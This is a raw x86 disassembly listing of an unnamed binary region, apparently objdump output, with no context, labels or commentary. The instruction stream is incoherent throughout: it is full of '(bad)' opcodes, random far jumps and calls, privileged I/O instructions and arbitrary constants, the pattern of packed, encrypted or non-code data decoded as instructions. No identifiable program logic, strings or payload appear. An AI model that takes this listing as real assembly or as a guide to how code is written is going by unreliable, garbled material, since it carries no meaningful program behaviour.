  422298:	xor    al,0xbf
  42229a:	push   ds
  42229b:	(bad)  
  42229c:	ss retf 0xd970
  4222a0:	xchg   esp,eax
  4222a1:	push   edi
  4222a2:	jns    0x42224c
  4222a4:	punpckhwd mm7,QWORD PTR [edi]
  4222a7:	int3   
  4222a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222a9:	inc    esi
  4222aa:	pop    ecx
  4222ab:	push   edi
  4222ac:	aaa    
  4222ad:	ins    BYTE PTR es:[edi],dx
  4222ae:	mov    WORD PTR fs:[eax-0x11],?
  4222b2:	pop    esp
  4222b3:	cmc    
  4222b4:	imul   DWORD PTR cs:[eax-0x5e61fe94]
  4222bb:	pop    ebx
  4222bc:	cmp    eax,0x39f90420
  4222c1:	(bad)  [edx]
  4222c3:	adc    DWORD PTR [edi+eax*1],0x4d
  4222c7:	push   cs
  4222c8:	push   cs
  4222c9:	mov    ecx,0xe23d93c4
  4222ce:	cs fsin 
  4222d1:	xchg   esp,eax
  4222d2:	into   
  4222d3:	data16 xor BYTE PTR [ebp-0x7178c97f],0xb6
  4222db:	jge    0x4222e3
  4222dd:	ror    ch,cl
  4222df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222e0:	ret    
  4222e1:	mov    bl,BYTE PTR [esi+edi*2+0x7]
  4222e5:	dec    ebx
  4222e6:	inc    ebx
  4222e7:	sub    BYTE PTR [esi+0x3caf7f2d],bh
  4222ed:	lds    ebx,FWORD PTR [edx-0x1ed619e0]
  4222f3:	lahf   
  4222f4:	cmp    dh,cl
  4222f6:	push   0x1e
  4222f8:	add    eax,0x7a1280d0
  4222fd:	inc    eax
  4222fe:	outs   dx,DWORD PTR ds:[esi]
  4222ff:	pop    edi
  422300:	mov    dl,0x14
  422302:	test   BYTE PTR [ecx+0x508dd147],dl
  422308:	mov    edi,ecx
  42230a:	inc    ebx
  42230b:	sti    
  42230c:	or     ebp,DWORD PTR [ebp-0x4a05e9d6]
  422312:	and    eax,0x7a359b1
  422317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422318:	mov    al,ds:0xa940f765
  42231d:	call   0x2111:0xd917d3ce
  422324:	idiv   DWORD PTR [edx-0xf]
  422327:	cmp    bh,BYTE PTR [edx+ebx*1+0x291c08ba]
  42232e:	out    dx,al
  42232f:	sbb    al,0xdf
  422331:	popf   
  422332:	mov    cl,0xfa
  422334:	(bad)  
  422335:	jg     0x422387
  422337:	call   0x54dfb74d
  42233c:	xchg   esi,eax
  42233d:	xor    DWORD PTR [edi-0x74],esp
  422340:	les    edi,FWORD PTR [edx]
  422342:	jns    0x422335
  422344:	scas   eax,DWORD PTR es:[edi]
  422345:	jo     0x42237b
  422347:	xchg   edi,eax
  422348:	loop   0x42232f
  42234a:	push   es
  42234b:	test   DWORD PTR [ebx+ecx*8+0x16],ebx
  42234f:	test   eax,0xfa7ea2bf
  422354:	jb     0x4223c4
  422356:	adc    al,ah
  422358:	test   edi,ebx
  42235a:	dec    DWORD PTR [ebp+edi*2-0x27caa156]
  422361:	dec    esi
  422362:	iret   
  422363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422364:	fwait
  422365:	mov    esp,0x3806df6a
  42236a:	dec    eax
  42236b:	das    
  42236c:	xor    al,0xa7
  42236e:	(bad)  
  422371:	stos   BYTE PTR es:[di],al
  422373:	push   0xffffffdb
  422375:	push   0x7658107d
  42237a:	sbb    bl,0x7
  42237d:	rsqrtps xmm7,XMMWORD PTR [esi]
  422380:	adc    cl,cl
  422382:	sub    ch,bl
  422384:	cdq    
  422385:	push   0x6198f685
  42238a:	push   cs
  42238b:	mov    al,0x12
  42238d:	add    BYTE PTR [esi-0x1b95c036],al
  422393:	inc    edx
  422394:	inc    esp
  422395:	sti    
  422396:	inc    ebp
  422397:	dec    esi
  422398:	dec    eax
  422399:	jbe    0x42240c
  42239b:	addr16 mov al,0x48
  42239e:	cs cld 
  4223a0:	dec    ecx
  4223a1:	jne    0x4223ef
  4223a3:	outs   dx,BYTE PTR ds:[esi]
  4223a4:	push   cs
  4223a5:	add    al,0x9b
  4223a7:	cmp    eax,0xbd0f33c2
  4223ac:	mov    WORD PTR [edi-0x29146855],cs
  4223b2:	mov    bh,BYTE PTR ds:0xef044bf5
  4223b8:	mov    WORD PTR [eax+ecx*4-0x783ed19b],ss
  4223bf:	sbb    eax,0x380a36d1
  4223c4:	push   ebx
  4223c5:	bnd jno 0x4223de
  4223c8:	pop    edi
  4223c9:	adc    edi,DWORD PTR [esi]
  4223cb:	addr16 push 0xffffffad
  4223ce:	sti    
  4223cf:	pop    ds
  4223d0:	jmp    0xfe21:0x2bf646ea
  4223d7:	xor    eax,0xc8860088
  4223dc:	mov    esi,0xdfdbb966
  4223e1:	adc    al,0xee
  4223e3:	sahf   
  4223e4:	out    0x85,eax
  4223e6:	lock mov edx,DWORD PTR [ebx-0x12]
  4223ea:	push   ds
  4223eb:	lds    ebx,FWORD PTR [eax]
  4223ed:	add    BYTE PTR [edx+0x410facb0],ah
  4223f3:	mov    al,ds:0x57bede1d
  4223f8:	dec    ecx
  4223f9:	cmp    eax,0x3eebe8de
  4223fe:	xchg   esp,eax
  4223ff:	aas    
  422400:	mov    esi,0xd54843b4
  422405:	mov    DWORD PTR [edi],edx
  422407:	jmp    0xebbc9518
  42240c:	add    BYTE PTR [esp+edx*8],al
  42240f:	pop    edi
  422410:	or     eax,0xdf3d9068
  422415:	dec    esp
  422416:	mov    ebx,0x506fcd64
  42241b:	mov    eax,0x1bd733ca
  422420:	push   0x70
  422422:	loope  0x422486
  422424:	ret    0x977f
  422427:	ins    BYTE PTR es:[edi],dx
  422428:	in     eax,dx
  422429:	loope  0x422404
  42242b:	clc    
  42242c:	xchg   ebp,edx
  42242e:	ja     0x42249e
  422430:	jo     0x4223b4
  422432:	mov    al,0x9d
  422434:	and    edi,esi
  422436:	outs   dx,BYTE PTR ds:[esi]
  422437:	popf   
  422438:	(bad)  
  422439:	push   es
  42243a:	setbe  bh
  42243d:	(bad)  
  42243e:	dec    ebx
  42243f:	jge    0x42248e
  422441:	mov    al,0x27
  422443:	and    eax,0xe6c81eda
  422448:	mov    eax,0x75117e7b
  42244d:	xchg   ecx,eax
  42244e:	mov    dl,0xbc
  422450:	ja     0x42246f
  422452:	inc    ebx
  422453:	xor    eax,DWORD PTR [ecx]
  422455:	aas    
  422456:	sar    DWORD PTR [esi-0x68],cl
  422459:	xor    ecx,ecx
  42245b:	sbb    edi,esp
  42245d:	gs jne 0x422438
  422460:	jecxz  0x4223ff
  422462:	int3   
  422463:	fwait
  422464:	out    dx,eax
  422465:	sbb    eax,0xebcc5745
  42246a:	(bad)  
  42246b:	rol    al,1
  42246d:	clc    
  42246e:	lahf   
  42246f:	adc    eax,0x9b123288
  422474:	jno    0x422417
  422476:	scas   al,BYTE PTR es:[edi]
  422477:	dec    BYTE PTR [esp+eax*1]
  42247a:	cmp    DWORD PTR [edi],0xffffff8e
  42247d:	inc    esp
  42247e:	(bad)  
  42247f:	retf   0x5375
  422482:	push   es
  422483:	jb     0x422465
  422485:	xor    esi,DWORD PTR [ecx+ebp*1-0x28]
  422489:	mov    esi,0x27f6cdb6
  42248e:	clc    
  42248f:	adc    eax,0x33505d0e
  422494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422495:	shl    DWORD PTR [esi-0x79],1
  422498:	jnp    0x42249c
  42249a:	dec    edi
  42249b:	sahf   
  42249c:	jmp    0x9357:0x3a50977b
  4224a3:	jb     0x422445
  4224a5:	fsub   st(6),st
  4224a7:	push   ecx
  4224a8:	into   
  4224a9:	xor    ebx,DWORD PTR [esi+eiz*1+0x78]
  4224ad:	paddsw mm5,mm0
  4224b0:	(bad)  
  4224b1:	push   edx
  4224b2:	pop    es
  4224b3:	stos   BYTE PTR es:[edi],al
  4224b4:	sbb    eax,0x421e7527
  4224b9:	jmp    0x5149:0xa31878d6
  4224c0:	lods   al,BYTE PTR ds:[esi]
  4224c1:	push   esp
  4224c2:	mov    dh,0x84
  4224c4:	popf   
  4224c5:	add    DWORD PTR [eax-0x5a],0xbc99967b
  4224cc:	scas   eax,DWORD PTR es:[edi]
  4224cd:	push   esp
  4224ce:	jp     0x42251e
  4224d0:	(bad)  
  4224d1:	pop    ss
  4224d2:	push   ebx
  4224d3:	das    
  4224d4:	stos   DWORD PTR es:[edi],eax
  4224d5:	xor    eax,0xb609e252
  4224da:	jmp    0x4ea2:0xebf8101b
  4224e1:	pop    edx
  4224e2:	pushf  
  4224e3:	xchg   ebp,eax
  4224e4:	mov    eax,ds:0x3e387ee3
  4224e9:	mov    ebp,0xfbe8ce5a
  4224ee:	jo     0x422551
  4224f0:	popf   
  4224f1:	(bad)  
  4224f2:	sti    
  4224f3:	push   0x8a875639
  4224f8:	xchg   DWORD PTR [edi],eax
  4224fa:	retf   0x862
  4224fd:	push   cs
  4224fe:	xor    esi,ecx
  422500:	pop    ebx
  422501:	(bad)  
  422502:	lock aaa 
  422504:	xchg   ebx,eax
  422505:	sub    al,BYTE PTR [edi-0x46]
  422508:	or     eax,0x35b2a5e0
  42250d:	shl    DWORD PTR [ecx-0x529957e],1
  422513:	xor    edi,DWORD PTR [eax-0x63]
  422516:	shr    DWORD PTR [esi],0xbe
  422519:	call   0xcb779a10
  42251e:	xchg   ebp,eax
  42251f:	leave  
  422520:	std    
  422521:	jle    0x4224aa
  422523:	ret    0x31b4
  422526:	mov    edi,gs
  422528:	bswap  edi
  42252a:	mov    ah,0x3f
  42252c:	sahf   
  42252d:	pop    ss
  42252e:	mov    WORD PTR gs:[edx],?
  422531:	mov    ebx,0xe55e9d0
  422536:	dec    esp
  422537:	jp     0x42257d
  422539:	or     DWORD PTR [ecx-0x63b627],esi
  42253f:	mov    WORD PTR [ebp+esi*4+0x4f598a73],es
  422546:	stc    
  422547:	pop    es
  422548:	jne    0x42256e
  42254a:	icebp  
  42254b:	inc    esi
  42254c:	aam    0xf7
  42254e:	mov    ?,WORD PTR [edx]
  422550:	jmp    0x42251b
  422552:	push   esi
  422553:	pop    ecx
  422554:	bound  eax,QWORD PTR [eax+0x226c5fb2]
  42255a:	and    ebx,DWORD PTR [ecx-0x14845cd9]
  422560:	mov    eax,0x325865c7
  422565:	mov    ah,0xe6
  422567:	mov    BYTE PTR [edi-0x392bfa6a],0x68
  42256e:	xor    al,0xde
  422570:	sub    edx,ecx
  422572:	ins    DWORD PTR es:[edi],dx
  422573:	inc    ebx
  422574:	push   eax
  422575:	jb     0x4225e9
  422577:	cdq    
  422578:	loop   0x422503
  42257a:	jnp    0x422554
  42257c:	xor    ebx,ecx
  42257e:	out    dx,al
  42257f:	mov    esi,0xc9412ede
  422584:	(bad)  
  422586:	mov    al,0x9e
  422588:	arpl   WORD PTR [ecx-0x56154cc7],bp
  42258e:	jmp    0x7f30:0xfedaf05b
  422595:	retf   
  422596:	loope  0x42257d
  422598:	(bad)  
  422599:	mov    edx,ebp
  42259b:	and    ecx,DWORD PTR [eax]
  42259d:	jne    0x42260c
  42259f:	out    0xad,al
  4225a1:	(bad)  
  4225a3:	mov    bl,0x1c
  4225a5:	xchg   esp,eax
  4225a6:	dec    esi
  4225a7:	call   0xd07df48b
  4225ac:	cli    
  4225ad:	in     eax,0x64
  4225af:	ds xchg edx,eax
  4225b1:	stos   BYTE PTR es:[edi],al
  4225b2:	add    dl,0x19
  4225b5:	sahf   
  4225b6:	xchg   ch,ch
  4225b8:	push   edi
  4225b9:	aas    
  4225ba:	leave  
  4225bb:	jne    0x42255d
  4225bd:	mov    esp,0x54a7342c
  4225c2:	popf   
  4225c3:	fs jle 0x422644
  4225c6:	int3   
  4225c7:	(bad)  
  4225c9:	mov    al,BYTE PTR [ecx+0x3e]
  4225cc:	in     al,dx
  4225cd:	jge    0x422592
  4225cf:	ss sti 
  4225d1:	mov    ecx,0x6f96debd
  4225d6:	test   BYTE PTR [ebx+edi*8-0x30],ah
  4225da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225db:	fstp   QWORD PTR [esi+ebx*8+0x1c9cf7a5]
  4225e2:	test   BYTE PTR [eax],ah
  4225e4:	jg     0x422610
  4225e6:	and    al,0x4f
  4225e8:	jge    0x42259c
  4225ea:	push   ecx
  4225eb:	ss mov al,0x6a
  4225ee:	xchg   ebp,eax
  4225ef:	leave  
  4225f0:	cdq    
  4225f1:	in     eax,dx
  4225f2:	xor    dl,BYTE PTR [bx+si]
  4225f5:	mov    ah,0x64
  4225f7:	ja     0x422633
  4225f9:	in     al,0x70
  4225fb:	sbb    ah,BYTE PTR [ebx+0x5c]
  4225fe:	sbb    eax,0xc47ff932
  422603:	add    BYTE PTR [ecx+eiz*1],ch
  422606:	pop    ds
  422607:	jmp    0x346579de
  42260c:	imul   esp,DWORD PTR [eax],0x71643c65
  422612:	aaa    
  422613:	jmp    FWORD PTR [eax]
  422615:	imul   edx,DWORD PTR [ecx],0x4c
  422618:	leave  
  422619:	pop    es
  42261a:	jecxz  0x42263d
  42261c:	inc    eax
  42261d:	mov    eax,0x3be74229
  422622:	jne    0x42264b
  422624:	ja     0x422690
  422626:	or     eax,0x7cb5f981
  42262b:	fs jmp 0x422673
  42262e:	test   dh,dh
  422630:	pop    eax
  422631:	repnz push cs
  422633:	sti    
  422634:	cmc    
  422635:	daa    
  422636:	pop    ss
  422637:	pop    esi
  422638:	fisttp WORD PTR [eax+ebp*8]
  42263b:	fsub   QWORD PTR [edi-0x712473e]
  422641:	push   DWORD PTR [edx]
  422643:	mov    ch,0x65
  422645:	bound  ebp,QWORD PTR ds:0xf8e9bb27
  42264b:	icebp  
  42264c:	add    ch,BYTE PTR [ebp+0x12c274b5]
  422652:	sar    BYTE PTR [eax],1
  422654:	jnp    0x4225f8
  422656:	clc    
  422657:	pop    ds
  422658:	sbb    ecx,DWORD PTR [ebx-0xcb0835a]
  42265e:	mov    dl,0x31
  422660:	(bad)  
  422661:	sub    DWORD PTR [ebx-0x3f],edi
  422664:	cmp    BYTE PTR [edi-0x50],bh
  422667:	mov    dl,0xaa
  422669:	test   DWORD PTR [esp+edx*2],0x72685e6d
  422670:	mov    ecx,0x64472517
  422675:	xor    edx,DWORD PTR [ebp+0x2ef7d001]
  42267b:	xchg   ebx,eax
  42267c:	add    DWORD PTR [edx+0x7c],ecx
  42267f:	xchg   eax,edi
  422681:	dec    ebp
  422682:	push   es
  422683:	popa   
  422684:	jnp    0x422640
  422686:	int    0x36
  422688:	call   0xce51:0x356ffbd1
  42268f:	std    
  422690:	inc    edx
  422691:	loope  0x42270d
  422693:	jl     0x422616
  422695:	cmp    DWORD PTR ds:0x24b8d7ac,0xc026608d
  42269f:	mov    BYTE PTR [edi+0x51],al
  4226a2:	pop    ss
  4226a3:	sar    bh,cl
  4226a5:	pushf  
  4226a6:	addr16 out 0x67,al
  4226a9:	test   eax,0xcbc0dcab
  4226ae:	in     al,0x65
  4226b0:	clc    
  4226b1:	and    dh,dh
  4226b3:	scas   eax,DWORD PTR es:[edi]
  4226b4:	xchg   ebx,eax
  4226b5:	and    cl,BYTE PTR [eax+0x1]
  4226b8:	es inc ebx
  4226ba:	sbb    BYTE PTR [eax],ah
  4226bc:	cwde   
  4226bd:	fldcw  WORD PTR [ebp-0x73]
  4226c0:	mov    dh,0x31
  4226c2:	pop    es
  4226c3:	rcr    DWORD PTR [eax+0x6d],1
  4226c6:	aad    0x10
  4226c8:	shr    DWORD PTR [edx-0x68],0x26
  4226cc:	sub    ebx,DWORD PTR [edx-0x4a]
  4226cf:	icebp  
  4226d0:	adc    DWORD PTR [eax-0x6f1905b],eax
  4226d6:	fstp   DWORD PTR [ecx]
  4226d8:	fwait
  4226d9:	mov    edi,0xbc5c5e75
  4226de:	xchg   DWORD PTR [edi],ecx
  4226e0:	and    ch,BYTE PTR [ebp+0x2f]
  4226e3:	arpl   sp,bx
  4226e5:	(bad)  
  4226e6:	pop    ss
  4226e7:	shl    BYTE PTR [eax+0xf080aef],0xe0
  4226ee:	dec    esp
  4226ef:	pop    ds
  4226f0:	outs   dx,DWORD PTR ds:[esi]
  4226f1:	sahf   
  4226f2:	xchg   ebx,eax
  4226f3:	icebp  
  4226f4:	das    
  4226f5:	mov    ebp,0x57fcf3d7
  4226fa:	mov    edi,0x84a69775
  4226ff:	xchg   edx,eax
  422700:	and    esi,DWORD PTR [eax-0x31]
  422703:	mov    ah,0xa9
  422705:	adc    al,0xc7
  422707:	dec    edx
  422708:	(bad)  
  422709:	mov    esi,0x8bb14b1f
  42270e:	pop    ecx
  42270f:	js     0x42277f
  422711:	aad    0xc8
  422713:	jl     0x4226a6
  422715:	jno    0x422771
  422717:	aas    
  422718:	test   al,0xec
  42271a:	ins    DWORD PTR es:[edi],dx
  42271b:	mov    cl,BYTE PTR [edx+0x75]
  42271e:	(bad)  
  42271f:	sbb    BYTE PTR [ebx],bl
  422721:	mov    DWORD PTR [esi],0x1710006c
  422727:	(bad)  
  422729:	xor    BYTE PTR [eax],ah
  42272b:	pop    edx
  42272c:	sbb    al,0xe8
  42272e:	or     edx,DWORD PTR [ebp-0x69]
  422731:	shr    BYTE PTR [edi-0x1ba177a0],1
  422737:	push   0x5b
  422739:	mov    cl,0x2c
  42273b:	and    eax,0xb37f4d00
  422740:	cmp    DWORD PTR [edi+0x3f41ee4d],ebx
  422746:	ficom  DWORD PTR [edx]
  422748:	mov    ds:0x75dc1f4,al
  42274d:	pop    eax
  42274e:	sbb    al,0x19
  422750:	(bad)  
  422751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422753:	sar    ah,cl
  422755:	leave  
  422756:	jmp    0x4227a8
  422758:	inc    ebx
  422759:	add    eax,0xb3c7e92f
  42275e:	mov    ds:0x605fee5b,eax
  422763:	jb     0x4227c5
  422765:	call   DWORD PTR [eax-0x724feea5]
  42276b:	and    dh,BYTE PTR [edi-0x23]
  42276e:	fidivr DWORD PTR [esi-0x5a]
  422771:	inc    ecx
  422772:	out    0x5d,al
  422774:	adc    bh,BYTE PTR [edx-0x54]
  422777:	ror    DWORD PTR [ecx-0x26944459],0x73
  42277e:	in     al,dx
  42277f:	dec    esp
  422780:	adc    DWORD PTR [edx],ebx
  422782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422783:	fisttp WORD PTR [ebx+0x3]
  422786:	pop    eax
  422787:	inc    ebx
  422788:	call   0x5cee161c
  42278d:	mov    ch,0x3d
  42278f:	dec    ebx
  422790:	push   0x55
  422792:	cwde   
  422793:	shr    BYTE PTR [ebp-0x251ffc2b],cl
  422799:	(bad)  
  42279a:	inc    di
  42279c:	daa    
  42279d:	cmp    bh,ch
  42279f:	sbb    DWORD PTR [ecx],0x7b
  4227a2:	fisubr DWORD PTR [ecx]
  4227a4:	loop   0x42278d
  4227a6:	pop    eax
  4227a7:	lock cld 
  4227a9:	loopne 0x4227d9
  4227ab:	lods   al,BYTE PTR ds:[esi]
  4227ac:	repz (bad) 
  4227af:	fimul  DWORD PTR [eax+0x6e]
  4227b2:	and    BYTE PTR [esi+0x51],dh
  4227b5:	das    
  4227b6:	pop    ds
  4227b7:	daa    
  4227b8:	icebp  
  4227b9:	sti    
  4227ba:	push   ss
  4227bb:	fsubr  QWORD PTR [esi]
  4227bd:	pop    ss
  4227be:	test   al,0x2f
  4227c0:	aas    
  4227c1:	cmp    BYTE PTR [edx+0x1e],al
  4227c4:	pop    ss
  4227c5:	clc    
  4227c6:	sub    al,0x5
  4227c8:	xchg   esi,eax
  4227c9:	je     0x4227d0
  4227cb:	jo     0x4227c5
  4227cd:	cli    
  4227ce:	enter  0x6d83,0x15
  4227d2:	mov    ah,0xa0
  4227d4:	xchg   edx,eax
  4227d5:	gs inc ecx
  4227d7:	in     eax,dx
  4227d8:	inc    eax
  4227d9:	mov    ?,WORD PTR [ecx+ebp*8-0x2c661cd0]
  4227e0:	jns    0x422786
  4227e2:	fs retf 0x9a09
  4227e6:	mov    WORD PTR [edx],ss
  4227e8:	inc    edx
  4227e9:	pop    edi
  4227ea:	dec    ebp
  4227eb:	jg     0x4227e6
  4227ed:	not    DWORD PTR ds:0x33f6ac99
  4227f3:	inc    edi
  4227f4:	xor    BYTE PTR [ebx],dl
  4227f6:	push   0x28
  4227f8:	mov    ds:0x5733b2f8,eax
  4227fd:	jae    0x42278b
  4227ff:	in     al,dx
  422800:	jg     0x4227ff
  422802:	xchg   esp,eax
  422803:	dec    ebx
  422804:	std    
  422805:	mov    dl,0x88
  422807:	jne    0x422814
  422809:	sbb    dh,BYTE PTR [esi+0x24]
  42280c:	cdq    
  42280d:	or     DWORD PTR [eax-0x6ab677b1],0x8
  422814:	lds    edi,FWORD PTR [esi-0x5a]
  422817:	mov    ebp,0x366f7dc7
  42281c:	inc    esp
  42281d:	ror    BYTE PTR [eax-0x5e6b7873],1
  422823:	add    BYTE PTR [eax],0xb4
  422826:	cmc    
  422827:	xchg   ebp,eax
  422828:	clc    
  422829:	push   ds
  42282a:	or     eax,ebx
  42282c:	in     al,dx
  42282d:	sbb    eax,0x81e1bae7
  422832:	ja     0x4227d3
  422834:	or     ch,BYTE PTR [ebx+0x1f]
  422837:	mov    ds:0xa27024b,eax
  42283d:	fld    DWORD PTR [eax+0x75]
  422840:	pop    eax
  422841:	mov    ah,0x89
  422843:	dec    ebp
  422844:	add    cl,bl
  422846:	sub    BYTE PTR [edi+0x2],dl
  422849:	test   al,0x72
  42284b:	loop   0x4227d4
  42284d:	(bad)  
  42284e:	sti    
  42284f:	push   ebx
  422850:	test   dh,al
  422852:	in     al,dx
  422853:	cmp    edi,ecx
  422855:	ficom  WORD PTR [edx+eiz*8]
  422858:	in     al,0x5f
  42285a:	icebp  
  42285b:	ja     0x422889
  42285d:	into   
  42285e:	outs   dx,BYTE PTR ds:[esi]
  42285f:	xchg   ecx,eax
  422860:	loop   0x4227f8
  422862:	nop
  422863:	leave  
  422864:	add    bl,BYTE PTR [eax]
  422866:	inc    ebx
  422867:	mov    ds:0x23acd0d7,eax
  42286c:	jns    0x4227fc
  42286e:	mov    bl,BYTE PTR [ecx+ebx*2+0x3]
  422872:	cld    
  422873:	jl     0x42281b
  422875:	nop
  422876:	lock les esi,FWORD PTR [edi+0x721626e5]
  42287d:	jnp    0x422847
  42287f:	arpl   WORD PTR [ebp-0x1e],cx
  422882:	leave  
  422883:	test   ch,cl
  422885:	iret   
  422886:	jo     0x422833
  422888:	sbb    cl,BYTE PTR [edi]
  42288a:	push   es
  42288b:	mov    dh,0x1e
  42288d:	lahf   
  42288e:	leave  
  42288f:	pop    ds
  422890:	(bad)  
  422891:	in     al,0x84
  422893:	call   0xe0029a0b
  422898:	jmp    0x42286d
  42289a:	lea    edx,[edx-0x4c]
  42289d:	push   edi
  42289e:	mov    ebp,0x67e0c034
  4228a3:	or     eax,0xa5648291
  4228a8:	cmc    
  4228a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228aa:	ret    
  4228ab:	or     BYTE PTR [ebx],ch
  4228ad:	mov    esp,0x9709aa05
  4228b2:	xlat   BYTE PTR ds:[ebx]
  4228b3:	sub    eax,0x2a504d48
  4228b8:	aad    0xf9
  4228ba:	adc    BYTE PTR [edx],0x2f
  4228bd:	add    ebx,ebp
  4228bf:	lahf   
  4228c0:	rcr    BYTE PTR [edx-0x18],1
  4228c3:	adc    eax,DWORD PTR [ebp-0xc]
  4228c6:	push   ebx
  4228c7:	adc    esi,DWORD PTR gs:[eax+0x29279fb9]
  4228ce:	mov    bh,0x74
  4228d0:	sub    al,dh
  4228d2:	xor    BYTE PTR [edi+0x14aea4c1],ch
  4228d8:	or     al,0x70
  4228da:	or     bl,BYTE PTR [eax-0x6f]
  4228dd:	or     al,0x3c
  4228df:	es repz cmc 
  4228e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228e3:	mov    dl,0xe6
  4228e5:	data16 repz jo 0x4228c8
  4228e9:	fisttp WORD PTR [edx-0x68626d44]
  4228ef:	mov    ah,0xd9
  4228f1:	add    eax,0x18923620
  4228f6:	addr16 sbb al,0x52
  4228f9:	cmp    eax,0xdf52bf96
  4228fe:	inc    DWORD PTR [ecx]
  422900:	ret    
  422901:	int3   
  422902:	mov    edi,DWORD PTR [eax+edx*1]
  422905:	shr    edx,0x61
  422908:	sbb    ah,bh
  42290a:	or     bl,BYTE PTR ds:0x47ffc30
  422910:	fs imul edx,ecx,0xffffffbb
  422914:	push   ecx
  422915:	ret    
  422916:	or     DWORD PTR [edx+ebx*1],edx
  422919:	(bad)  
  42291a:	jmp    0x422935
  42291c:	lods   al,BYTE PTR ds:[esi]
  42291d:	popa   
  42291e:	mov    DWORD PTR [ebp+0x5a209d2c],eax
  422924:	add    dl,BYTE PTR [esi]
  422926:	repnz sti 
  422928:	mov    ebp,0xd0068e3a
  42292d:	mov    edx,0x2388fa1c
  422932:	sbb    eax,0xf6e7a26
  422937:	test   eax,0xde7d3727
  42293c:	icebp  
  42293d:	push   0x92106e86
  422942:	aas    
  422943:	xor    dl,BYTE PTR [ebp-0x24]
  422946:	(bad)  
  422947:	jmp    0x766dc1ad
  42294c:	xor    DWORD PTR [eax-0x5db3af66],esp
  422952:	push   esi
  422953:	cmc    
  422954:	push   cs
  422955:	jmp    0x93714d95
  42295a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42295b:	sub    bh,dh
  42295d:	adc    eax,0x63807543
  422962:	and    al,0x2b
  422964:	mov    al,ds:0xed67379c
  422969:	fwait
  42296a:	lea    esp,fs:[ebx+esi*2]
  42296e:	dec    DWORD PTR [edi+0xb333a3f]
  422974:	dec    esi
  422975:	stos   BYTE PTR es:[edi],al
  422976:	int    0xcd
  422978:	call   0xf1c0:0x1adf3655
  42297f:	dec    edx
  422980:	fadd   QWORD PTR [edx+0x5d]
  422983:	xor    dl,BYTE PTR [ebx-0x17]
  422986:	jmp    0x8a0d1a08
  42298b:	shl    BYTE PTR [ebx],1
  42298d:	adc    eax,0x5aa183a1
  422992:	lods   eax,DWORD PTR ds:[esi]
  422993:	mov    dh,0x7
  422995:	fidiv  WORD PTR [ebx+0x2308ed39]
  42299b:	stos   DWORD PTR es:[edi],eax
  42299c:	frstor [ecx-0x5c]
  42299f:	aad    0x1c
  4229a1:	retf   
  4229a2:	cdq    
  4229a3:	cmp    eax,0x93711410
  4229a8:	dec    ebx
  4229a9:	repz das 
  4229ab:	fucomp st(1)
  4229ad:	cdq    
  4229ae:	push   es
  4229af:	pop    ecx
  4229b0:	es pop ds
  4229b2:	inc    ebp
  4229b3:	dec    ebp
  4229b4:	imul   ebp,DWORD PTR [ecx+0xb],0xe82ec40
  4229bb:	pop    edi
  4229bc:	inc    ebp
  4229bd:	push   cs
  4229be:	rcl    dl,1
  4229c0:	xchg   esi,eax
  4229c1:	mov    edi,0x59bd178d
  4229c6:	in     eax,dx
  4229c7:	adc    eax,0xf04b1f81
  4229cc:	push   esp
  4229cd:	sbb    eax,0x3c6fd29a
  4229d2:	sbb    dl,bl
  4229d4:	jp     0x422a1f
  4229d6:	xor    DWORD PTR [ecx-0x4c],ebp
  4229d9:	dec    esi
  4229da:	clc    
  4229db:	test   BYTE PTR [ecx],ch
  4229dd:	lock (bad) [ebx+0x5c13ba8f]
  4229e4:	inc    ebp
  4229e5:	ins    DWORD PTR es:[edi],dx
  4229e6:	mov    edx,0x52e2db95
  4229eb:	and    DWORD PTR [eax-0x2dbf0189],edi
  4229f1:	push   es
  4229f2:	jo     0x422a64
  4229f4:	arpl   ax,bx
  4229f6:	lea    edx,[edx+0x3f]
  4229f9:	retf   0x7b1b
  4229fc:	adc    cl,al
  4229fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229ff:	dec    ebx
  422a00:	lahf   
  422a01:	mov    eax,ds:0x5e6f362b
  422a06:	ret    
  422a07:	dec    ecx
  422a08:	shr    DWORD PTR [eax+0xd],0x5c
  422a0c:	jmp    edi
  422a0e:	lds    esi,FWORD PTR [ebp+0x6abf949c]
  422a14:	das    
  422a15:	aam    0xbb
  422a17:	dec    edi
  422a18:	mov    dl,0xd3
  422a1a:	sbb    eax,0x208abe05
  422a1f:	jno    0x4229bf
  422a21:	fnstenv [ebp-0x25]
  422a24:	add    ecx,DWORD PTR [edi+0x53]
  422a27:	icebp  
  422a28:	cli    
  422a29:	cmp    DWORD PTR [edi+0x37],edi
  422a2c:	out    0xd0,eax
  422a2e:	xchg   ecx,eax
  422a2f:	mov    bh,0xf9
  422a31:	cwde   
  422a32:	nop
  422a33:	(bad)  [ecx-0x61]
  422a36:	repnz mov ebx,0xfb1ac501
  422a3c:	mov    DWORD PTR [edx],edx
  422a3e:	mov    WORD PTR [esi],?
  422a40:	rol    ah,0x11
  422a43:	rcr    BYTE PTR [eax+0x76],1
  422a46:	cmc    
  422a47:	fmul   st,st(7)
  422a49:	xchg   ecx,eax
  422a4a:	rol    DWORD PTR ds:0xc436f889,0x8e
  422a51:	mov    ebp,0x2a1ad4e4
  422a56:	(bad)  
  422a57:	sub    BYTE PTR [ecx],al
  422a59:	sahf   
  422a5a:	stos   DWORD PTR es:[edi],eax
  422a5b:	test   al,0x87
  422a5d:	fwait
  422a5e:	xchg   edx,eax
  422a5f:	jbe    0x422a8d
  422a61:	jno    0x422a6b
  422a63:	inc    ebp
  422a64:	stos   DWORD PTR es:[edi],eax
  422a65:	lahf   
  422a66:	(bad)  
  422a67:	fisttp QWORD PTR [esi+0x2acacd3]
  422a6d:	pop    edx
  422a6e:	loope  0x422a82
  422a70:	xchg   esp,edi
  422a72:	lock lds edi,FWORD PTR ss:[ebx+0x9d7941b]
  422a7a:	daa    
  422a7b:	fbld   TBYTE PTR [esi+0x17]
